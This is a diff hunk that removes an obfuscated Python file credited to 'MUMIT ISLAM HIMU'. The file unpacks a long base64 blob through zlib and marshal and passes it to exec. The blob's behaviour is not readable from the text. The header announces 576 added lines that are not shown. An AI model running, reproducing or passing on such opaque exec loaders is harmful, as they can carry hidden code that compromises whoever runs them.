@@ -1,6 +1,576 @@
-#ENCODED BY : MUMIT ISLAM HIMU
-#ENCRYPTION : Py3 MARSHAL+ZLIB+B64
-#GITHUB : https://github.com/MUMIT-404-CYBER
-#----------------------------------------------
-import marshal, base64, zlib
-exec(marshal.loads(zlib.decompress(base64.b64decode(b'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